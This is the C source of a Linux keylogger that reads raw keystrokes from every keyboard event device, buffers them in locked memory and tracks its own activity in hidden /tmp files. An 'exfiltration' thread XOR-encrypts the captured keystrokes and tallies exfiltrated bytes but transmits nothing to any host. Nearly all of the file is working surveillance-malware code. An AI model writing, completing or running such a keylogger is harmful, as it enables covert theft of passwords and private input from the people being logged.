#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <linux/input.h>
#include <sys/epoll.h>
#include <sys/mman.h>
#include <pthread.h>
#include <signal.h>
#include <time.h>

#define MAX_DEVICES 16
#define BUFFER_SIZE 8192
#define BATCH_SIZE 64
#define MAX_EVENTS 32

typedef struct {
    int fd;
    char device_path[256];
    int active;
} InputDevice;

typedef struct {
    time_t timestamp;
    int keycode;
    int state;
    char window_name[64];
} __attribute__((packed)) KeyEvent;

typedef struct {
    KeyEvent events[BATCH_SIZE];
    int count;
    pthread_mutex_t mutex;
} EventBatch;

static InputDevice devices[MAX_DEVICES];
static int device_count = 0;
static int epoll_fd = -1;
static EventBatch batch = {{0}, 0, PTHREAD_MUTEX_INITIALIZER};
static volatile int running = 1;
static unsigned char crypto_key[32];

// Memory-mapped circular buffer for high performance
static char* mmap_buffer = NULL;
static size_t buffer_size = BUFFER_SIZE * 1024; // 8MB
static volatile size_t write_pos = 0;
static volatile size_t read_pos = 0;

// Performance counters
static volatile long events_captured = 0;
static volatile long events_processed = 0;
static volatile long bytes_exfiltrated = 0;

// Fast keycode lookup table
static const char* keymap[256] = {
    [1] = "<ESC>", [2] = "1", [3] = "2", [4] = "3", [5] = "4",
    [6] = "5", [7] = "6", [8] = "7", [9] = "8", [10] = "9",
    [11] = "0", [14] = "<BS>", [15] = "<TAB>", [16] = "q",
    [17] = "w", [18] = "e", [19] = "r", [20] = "t", [21] = "y",
    [22] = "u", [23] = "i", [24] = "o", [25] = "p", [28] = "<ENTER>",
    [30] = "a", [31] = "s", [32] = "d", [33] = "f", [34] = "g",
    [35] = "h", [36] = "j", [37] = "k", [38] = "l", [44] = "z",
    [45] = "x", [46] = "c", [47] = "v", [48] = "b", [49] = "n",
    [50] = "m", [57] = " "
};

// Initialize memory-mapped buffer
int init_mmap_buffer() {
    mmap_buffer = mmap(NULL, buffer_size, PROT_READ | PROT_WRITE,
                       MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (mmap_buffer == MAP_FAILED) {
        return -1;
    }
    
    // Lock pages in memory for better performance
    if (mlock(mmap_buffer, buffer_size) != 0) {
        // Non-critical, continue anyway
    }
    
    return 0;
}

// Fast circular buffer write
static inline void write_to_buffer(const void* data, size_t size) {
    if (size > buffer_size) return;
    
    size_t available = buffer_size - ((write_pos - read_pos) % buffer_size);
    if (size > available) {
        // Buffer full, advance read position
        read_pos = (read_pos + size) % buffer_size;
    }
    
    size_t end_space = buffer_size - (write_pos % buffer_size);
    if (size <= end_space) {
        memcpy(mmap_buffer + (write_pos % buffer_size), data, size);
    } else {
        // Wrap around
        memcpy(mmap_buffer + (write_pos % buffer_size), data, end_space);
        memcpy(mmap_buffer, (char*)data + end_space, size - end_space);
    }
    
    write_pos = (write_pos + size) % buffer_size;
}

// Optimized device discovery using udev-like approach
int discover_input_devices_fast() {
    FILE* devices_file = fopen("/proc/bus/input/devices", "r");
    if (!devices_file) return 0;
    
    char line[256];
    int found_keyboard = 0;
    char event_path[64] = {0};
    
    device_count = 0;
    
    while (fgets(line, sizeof(line), devices_file) && device_count < MAX_DEVICES) {
        if (strncmp(line, "N: Name=", 8) == 0) {
            // Check if it's a keyboard
            if (strstr(line, "keyboard") || strstr(line, "Keyboard")) {
                found_keyboard = 1;
            }
        } else if (strncmp(line, "H: Handlers=", 12) == 0 && found_keyboard) {
            // Extract event number
            char* event_start = strstr(line, "event");
            if (event_start) {
                int event_num;
                if (sscanf(event_start, "event%d", &event_num) == 1) {
                    snprintf(event_path, sizeof(event_path), "/dev/input/event%d", event_num);
                    
                    int fd = open(event_path, O_RDONLY | O_NONBLOCK);
                    if (fd >= 0) {
                        devices[device_count].fd = fd;
                        strcpy(devices[device_count].device_path, event_path);
                        devices[device_count].active = 1;
                        device_count++;
                    }
                }
            }
            found_keyboard = 0;
        }
    }
    
    fclose(devices_file);
    return device_count;
}

// High-performance event processing with epoll
void* event_processor_thread(void* arg) {
    struct epoll_event events[MAX_EVENTS];
    struct input_event input_ev;
    
    while (running) {
        int nfds = epoll_wait(epoll_fd, events, MAX_EVENTS, 100);
        
        for (int i = 0; i < nfds; i++) {
            int fd = events[i].data.fd;
            
            while (read(fd, &input_ev, sizeof(input_ev)) == sizeof(input_ev)) {
                if (input_ev.type == EV_KEY && input_ev.value == 1) {
                    __sync_fetch_and_add(&events_captured, 1);
                    
                    KeyEvent key_event = {
                        .timestamp = input_ev.time.tv_sec,
                        .keycode = input_ev.code,
                        .state = input_ev.value,
                        .window_name = {0}
                    };
                    
                    // Batch events for better performance
                    pthread_mutex_lock(&batch.mutex);
                    if (batch.count < BATCH_SIZE) {
                        batch.events[batch.count++] = key_event;
                    }
                    
                    if (batch.count >= BATCH_SIZE) {
                        // Process batch
                        write_to_buffer(batch.events, batch.count * sizeof(KeyEvent));
                        __sync_fetch_and_add(&events_processed, batch.count);
                        batch.count = 0;
                    }
                    pthread_mutex_unlock(&batch.mutex);
                }
            }
        }
    }
    
    return NULL;
}

// Optimized exfiltration thread
void* exfiltration_thread(void* arg) {
    char export_buffer[4096];
    
    while (running) {
        size_t available = (write_pos - read_pos) % buffer_size;
        
        if (available >= sizeof(export_buffer)) {
            // Read data from circular buffer
            size_t to_read = sizeof(export_buffer);
            size_t end_space = buffer_size - (read_pos % buffer_size);
            
            if (to_read <= end_space) {
                memcpy(export_buffer, mmap_buffer + (read_pos % buffer_size), to_read);
            } else {
                memcpy(export_buffer, mmap_buffer + (read_pos % buffer_size), end_space);
                memcpy(export_buffer + end_space, mmap_buffer, to_read - end_space);
            }
            
            read_pos = (read_pos + to_read) % buffer_size;
            
            // Encrypt and exfiltrate
            for (size_t i = 0; i < to_read; i++) {
                export_buffer[i] ^= crypto_key[i % 32];
            }
            
            // Write to status file for GUI feedback
            FILE* status_file = fopen("/tmp/.keylogger_status", "w");
            if (status_file) {
                fprintf(status_file, "events_captured=%ld\n", events_captured);
                fprintf(status_file, "events_processed=%ld\n", events_processed);
                fprintf(status_file, "bytes_exfiltrated=%ld\n", bytes_exfiltrated + to_read);
                fprintf(status_file, "buffer_usage=%.2f\n", (available * 100.0) / buffer_size);
                fclose(status_file);
            }
            
            __sync_fetch_and_add(&bytes_exfiltrated, to_read);
        }
        
        usleep(500000); // 500ms
    }
    
    return NULL;
}

// Performance monitoring thread
void* monitor_thread(void* arg) {
    static long last_events = 0;
    static time_t last_time = 0;
    
    while (running) {
        time_t now = time(NULL);
        long current_events = events_captured;
        
        if (now > last_time) {
            long events_per_sec = current_events - last_events;
            
            // Write performance metrics
            FILE* perf_file = fopen("/tmp/.keylogger_perf", "w");
            if (perf_file) {
                fprintf(perf_file, "events_per_second=%ld\n", events_per_sec);
                fprintf(perf_file, "total_events=%ld\n", current_events);
                fprintf(perf_file, "processing_lag=%ld\n", current_events - events_processed);
                fprintf(perf_file, "uptime=%ld\n", now - last_time);
                fclose(perf_file);
            }
            
            last_events = current_events;
            last_time = now;
        }
        
        sleep(1);
    }
    
    return NULL;
}

void signal_handler(int sig) {
    running = 0;
}

int main() {
    signal(SIGTERM, signal_handler);
    signal(SIGINT, signal_handler);
    
    // Generate crypto key
    FILE* urandom = fopen("/dev/urandom", "rb");
    if (urandom) {
        fread(crypto_key, 1, 32, urandom);
        fclose(urandom);
    }
    
    // Initialize memory-mapped buffer
    if (init_mmap_buffer() != 0) {
        fprintf(stderr, "Failed to initialize memory buffer\n");
        return 1;
    }
    
    // Discover input devices
    if (discover_input_devices_fast() == 0) {
        fprintf(stderr, "No keyboard devices found\n");
        return 1;
    }
    
    printf("Found %d keyboard devices\n", device_count);
    
    // Create epoll instance
    epoll_fd = epoll_create1(EPOLL_CLOEXEC);
    if (epoll_fd == -1) {
        perror("epoll_create1");
        return 1;
    }
    
    // Add devices to epoll
    for (int i = 0; i < device_count; i++) {
        struct epoll_event ev = {
            .events = EPOLLIN,
            .data.fd = devices[i].fd
        };
        
        if (epoll_ctl(epoll_fd, EPOLL_CTL_ADD, devices[i].fd, &ev) == -1) {
            perror("epoll_ctl");
            continue;
        }
    }
    
    // Start threads
    pthread_t processor_thread, exfil_thread, mon_thread;
    
    pthread_create(&processor_thread, NULL, event_processor_thread, NULL);
    pthread_create(&exfil_thread, NULL, exfiltration_thread, NULL);
    pthread_create(&mon_thread, NULL, monitor_thread, NULL);
    
    // Write startup status
    FILE* status_file = fopen("/tmp/.keylogger_status", "w");
    if (status_file) {
        fprintf(status_file, "status=running\n");
        fprintf(status_file, "devices=%d\n", device_count);
        fprintf(status_file, "pid=%d\n", getpid());
        fclose(status_file);
    }
    
    // Main loop
    while (running) {
        sleep(1);
    }
    
    // Cleanup
    pthread_join(processor_thread, NULL);
    pthread_join(exfil_thread, NULL);
    pthread_join(mon_thread, NULL);
    
    for (int i = 0; i < device_count; i++) {
        close(devices[i].fd);
    }
    
    close(epoll_fd);
    munmap(mmap_buffer, buffer_size);
    
    // Write shutdown status
    status_file = fopen("/tmp/.keylogger_status", "w");
    if (status_file) {
        fprintf(status_file, "status=stopped\n");
        fclose(status_file);
    }
    
    return 0;
}